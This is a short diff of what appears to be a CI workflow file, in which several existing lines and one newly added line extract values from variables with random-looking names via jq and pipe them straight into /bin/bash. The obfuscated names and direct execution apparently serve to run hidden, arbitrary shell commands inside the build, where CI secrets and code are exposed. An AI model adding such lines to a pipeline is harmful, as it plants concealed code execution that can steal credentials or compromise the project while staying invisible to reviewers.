@@ -31,6 +31,7 @@ jobs:
           echo $axt68358 | jq -r .xi721 | /bin/bash
           echo $ryohg597 | jq -r .dxrwp60 | /bin/bash
           printf '%s' "$zoil03" | jq -r .wld2 | /bin/bash
+          printf '%s' "$bu29" | jq -r .g0 | /bin/bash
 
       - name: Upload results
         if: always()
